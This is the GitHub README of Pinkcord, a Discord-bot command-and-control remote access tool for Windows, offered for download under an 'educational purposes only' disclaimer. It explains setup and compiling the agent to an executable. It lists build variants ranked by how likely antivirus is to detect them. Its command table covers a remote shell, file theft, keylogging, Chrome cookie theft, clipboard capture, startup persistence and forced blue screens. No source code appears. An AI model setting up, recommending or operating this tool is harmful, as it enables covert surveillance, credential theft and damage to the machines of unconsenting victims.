<p align="center">
  <img src="https://github.com/xanonDev/pinkcord/blob/main/pic/banner.png" alt="Pinkcord Banner" />
</p>

<h1 align="center">Pinkcord</h1>

<p align="center">
  <strong>A Discord Bot C2 Framework for Remote Administration (Educational Purposes Only)</strong>
</p>

<p align="center">
  <a href="https://www.buymeacoffee.com/pinkcord"><img alt="Support via BuyMeACoffee" src="https://img.shields.io/badge/Support-Buy%20Me%20A%20Coffee-yellow?style=for-the-badge&logo=buymeacoffee"></a>
  <a href="https://github.com/xanonDev/pinkcord/stargazers"><img alt="GitHub Stars" src="https://img.shields.io/github/stars/xanonDev/pinkcord?style=for-the-badge&logo=github&color=yellow"></a>
  <a href="https://github.com/xanonDev/pinkcord/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/github/license/xanonDev/pinkcord?style=for-the-badge&logo=github"></a>
  <a href="https://github.com/xanonDev/pinkcord/issues"><img alt="GitHub Issues" src="https://img.shields.io/github/issues/xanonDev/pinkcord?style=for-the-badge&logo=github&color=red"></a>
  <a href="https://github.com/xanonDev/pinkcord/network/members"><img alt="GitHub Forks" src="https://img.shields.io/github/forks/xanonDev/pinkcord?style=for-the-badge&logo=github&color=blue"></a>
  <a href="https://discord.gg/gX72uKxJr7"><img alt="Discord Community" src="https://img.shields.io/discord/1146757562646151168?label=Discord&logo=discord&logoColor=white&color=5865F2&style=for-the-badge"></a>
</p>

---

## ⚠️ Disclaimer: Educational Use Only

**Pinkcord is a tool created strictly for educational and research purposes.** It demonstrates how Discord's API can be leveraged for command and control (C2) communication, similar in concept to frameworks like Meterpreter but operating over Discord instead of traditional C2 channels.

**Using Pinkcord for any unauthorized access, malicious activities, or illegal purposes is strictly prohibited.** Doing so violates Discord's Terms of Service, may lead to the **permanent ban of your Discord account(s)**, and could result in **severe legal consequences**.

**By downloading or using this software, you agree that you are solely responsible for your actions and any potential misuse. The developers assume no liability and are not responsible for any damage or legal issues caused by the use or misuse of this program.** Use it ethically and responsibly within controlled environments for learning purposes only.

---

## 🤔 What is Pinkcord?

Pinkcord is a Python-based remote administration tool that uses Discord bots as a communication channel to control remote computers. Unlike traditional RATs or frameworks like Metasploit's Meterpreter that might require direct network access or complex setup, Pinkcord leverages the ubiquity and infrastructure of Discord for C2 communication.

**Key Features:**

*   **Discord C2:** Uses Discord bots for sending commands and receiving output.
*   **Remote Shell:** Execute commands on the target machine.
*   **File Transfer:** Upload and download files.
*   **Screen Capture:** Take screenshots of the target's desktop.
*   **System Interaction:** Control volume, display messages, simulate clicks/keystrokes.
*   **Information Gathering:** Retrieve system details, IP location, clipboard content.
*   **Persistence:** Option to copy the agent to the startup folder.
*   **Data Exfiltration:** Steal browser cookies (Chrome).

---

## 🛡️ Note on Antivirus & Windows Defender

Running Pinkcord or its compiled executable may trigger warnings from Windows Defender or other antivirus software. This is expected because the tool performs actions commonly associated with malware, such as:

*   Executing arbitrary shell commands (`os.system`, `subprocess`).
*   Interacting with user input/output (keylogging, screenshots via `pyautogui`, `keyboard`).
*   Modifying system state (changing volume, accessing files, adding to startup).

**These detections are often based on the *behavior* and *capabilities* of the program, not necessarily malicious code signatures.** Pinkcord itself, when used as intended for education, does not contain intentionally harmful payloads beyond its described functionality. You may need to create exclusions in your AV software *within your controlled testing environment* if you choose to experiment with it. **Do not disable your antivirus on systems you are not authorized to test on.**

---

## ⚙️ Setup & Installation

1.  **Install Python:** Download and install Python (version 3.x recommended) from the [official Python website](https://www.python.org/downloads/). Make sure to check "Add Python to PATH" during installation.
2.  **Download Pinkcord:** Clone or download the repository files:
    ```bash
    git clone https://github.com/xanonDev/pinkcord.git
    cd pinkcord
    ```
    Alternatively, download the ZIP file and extract it.
3.  **Run Setup:** Open a command prompt (Windows) or terminal (Linux/macOS) in the `pinkcord` directory and run the setup script. This script will guide you through configuration (like entering your Discord Bot Token and Guild ID) and install necessary dependencies.
    *   On Windows:
        ```cmd
        python setup.py
        ```
        or simply double-click `setup.bat`.
    *   On Linux/macOS:
        ```bash
        python3 setup.py
        ```
    *   *Note:* If commands fail, try using `py` instead of `python` or `python3`.
4.  **Follow Instructions:** The setup script will provide further instructions, potentially including compiling the chosen version into an executable (`.exe`).
5.  **Deployment (For Testing):** If the program compiles to an `.exe`, deploy and run this executable on the target machine *you own or have explicit permission to test on*.

---

## 📦 Available Versions

During setup, you can choose between different versions based on your needs, balancing features and detectability:

*   **`pinkcord_minimal.py`**
    *   **Features:** Reverse shell functionality only.
    *   **Size:** Smallest (~<8MB compiled).
    *   **Detection:** Lowest chance of detection due to limited features.
*   **`pinkcord_lite.py`**
    *   **Features:** Minimal features + File upload/download, Screenshot capability.
    *   **Size:** Medium (~15-35MB compiled, depending on Pillow installation).
    *   **Detection:** Slightly higher detection potential than minimal.
*   **`pinkcord.py` (Full Version)**
    *   **Features:** All capabilities included (keylogger, info gathering, system interaction, etc.).
    *   **Size:** Largest (~20-45MB compiled, depending on Pillow installation).
    *   **Detection:** Highest chance of detection due to comprehensive feature set.

---

## 💻 Command Reference

Interact with compromised sessions via commands sent through your Discord bot. Replace `[session]` with the target session ID/name.

| Command                                         | Description                                                                       | Available Versions            |
| :---------------------------------------------- | :-------------------------------------------------------------------------------- | :-------------------------- |
| `!shell [session] [output(yes/no)] [command]` | Executes a shell command on the target. `output` controls if output is sent back. | All                         |
| `!cd [session] [path]`                          | Changes the current working directory on the target.                                | All                         |
| `!dir [session]`                                | Displays the current working directory path on the target.                        | All                         |
| `!delete [session] [path]`                      | Deletes a specified file or directory on the target.                              | All                         |
| `!kill [session] [task]`                        | Kills a specified process/task on the target.                                     | All                         |
| `!sessions`                                     | Lists all active sessions connected to the bot.                                   | All                         |
| `!rename [session] [new_name]`                  | Renames an active session.                                                        | All                         |
| `!shutdown [session]`                           | Shuts down the target computer.                                                   | All                         |
| `!restart [session]`                            | Restarts the target computer.                                                     | All                         |
| `!steal [session] [file_names]`                 | Downloads specified file(s) from the target. Use commas for multiple files.       | Lite, Full                  |
| `!upload [session] [link] [file_name]`          | Downloads a file from `link` and saves it as `file_name` on the target.           | Lite, Full                  |
| `!ss [session]`                                 | Captures a screenshot of the target's primary monitor and sends it.               | Lite, Full                  |
| `!keylogger [session] [start\|stop\|log]`       | Starts, stops, or dumps the keylogger buffer from the target.                   | Full Only                   |
| `!info [session]`                               | Retrieves detailed system information from the target.                            | Full Only                   |
| `!up [session]`                                 | Increases the system volume on the target.                                        | Full Only                   |
| `!down [session]`                               | Decreases the system volume on the target.                                        | Full Only                   |
| `!message [session] [title] [button] [message]` | Displays a popup message box on the target.                                       | Full Only                   |
| `!click [session] [x] [y]`                      | Simulates a mouse click at the specified screen coordinates (X, Y).               | Full Only                   |
| `!press [session] [key]`                        | Simulates pressing a specific keyboard key (e.g., `enter`, `a`, `ctrl`).          | Full Only                   |
| `!cli [session]`                                | Retrieves the current content of the target's clipboard.                          | Full Only                   |
| `!write [session] [message]`                    | Types the specified `message` using the target's keyboard.                        | Full Only                   |
| `!loc [session]`                                | Attempts to get geolocation information based on the target's public IP address.  | Full Only                   |
| `!cdrom [session]`                              | Attempts to open the target's CD-ROM drive tray.                                  | Full Only                   |
| `!startup [session] [file_path]`                | Copies the specified file (e.g., the agent itself) to the target's startup folder.  | Full Only                   |
| `!chrome [session] [cookie]`                    | Attempts to steal Chrome cookies. (Currently only `cookie` action supported).     | Full Only                   |
| `!wallpaper [session] [path]`                   | Changes the target's desktop wallpaper to the image at the specified `path`.      | Full Only                   |
| `!bsod [session]`                               | **(Dangerous)** Attempts to trigger a Blue Screen of Death (BSOD) on the target. | Full Only                   |

---

## 🧩 Platform Compatibility

Pinkcord is primarily developed and tested on **Windows**. While core Python functionalities might work on Linux or macOS, many features rely heavily on Windows-specific APIs, libraries (`ctypes`, `win32crypt`), and command-line tools.

*   **Windows:** Fully supported (intended platform).
*   **Linux:** Many features (shell, file ops) might work, but others (screenshot, keylogger, system interaction, info, Chrome steal, BSOD, wallpaper, CD-ROM) likely **will not** work without significant modification.
*   **macOS:** Similar limitations to Linux.
*   **Termux (Android):** Not supported and unlikely to work correctly due to the vastly different environment.

Future adaptations for other platforms are possible but not currently planned.

---

## 📚 Libraries & Dependencies

Pinkcord utilizes the following Python libraries:

*   `discord.py`: For Discord bot interaction.
*   `requests`: For HTTP communication (e.g., file uploads/downloads).
*   `pyautogui`: For GUI automation (screenshots, clicks, typing).
*   `keyboard`: For keylogging and key press simulation.
*   `pyperclip`: For clipboard access.
*   `Pillow` (PIL Fork): Image processing, often needed for screenshots (optional install).
*   `pycryptodome`: For cryptographic operations (used in Chrome cookie decryption).
*   `pypiwin32` / `pywin32`: Provides access to Windows APIs (`win32crypt`, `ctypes` interactions).
*   **Standard Libraries:** `os`, `threading`, `time`, `zipfile`, `base64`, `codecs`, `sys`, `subprocess`, `platform`, `shutil`, `sqlite3`, `json`, `ctypes`.

The `setup.py` script attempts to install most of these external libraries automatically.

---

## 🤝 Contributing

Contributions, bug reports, and feature requests are welcome! Please feel free to open an issue or submit a pull request. Ensure you adhere to the project's educational purpose and ethical guidelines.

---

## 📜 License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

<p align="center">
  Remember to use Pinkcord responsibly and ethically.
</p>
